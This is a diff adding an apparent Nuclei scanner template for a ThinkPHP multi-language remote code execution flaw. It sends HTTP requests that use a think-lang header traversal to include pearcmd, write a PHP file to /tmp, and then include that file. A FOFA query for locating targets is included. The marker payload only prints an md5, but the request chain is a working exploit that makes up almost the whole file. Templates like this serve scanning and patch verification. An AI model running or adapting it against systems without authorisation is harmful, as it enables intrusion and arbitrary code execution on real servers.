@@ -1,0 +1,53 @@
+id: poc-local-thinkphp-lang-rce
+
+info:
+  name: poc-local-thinkphp-lang-rce
+  author: capiton
+  severity: critical
+  description: "如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。"
+  reference: 
+    - https://tttang.com/archive/1865/
+    - https://mp.weixin.qq.com/s/Q30_WddamXIr2b2Z-rWgww
+  metadata:
+    fofa-query: header="think_lang"
+    Vulnerability-Impact: Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+  file_name: '{{rand_base(6, "abc")}}'
+
+requests:
+  - raw:
+      - |-
+        GET /{{path}}?+config-create+/<?=var_dump(md5({{randInt}}));?>+/tmp/{{file_name}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        think-lang:../../../../../../../../usr/local/lib/php/pearcmd
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: think_lang=zh-cn
+
+      - |-
+        GET /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        think-lang:../../../../../../../../tmp/{{file_name}}
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: think_lang=zh-cn
+
+    attack: clusterbomb
+    stop-at-first-match: true
+    payloads:
+      path: 
+        - index.php
+        - public/index.php
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_randInt}}"
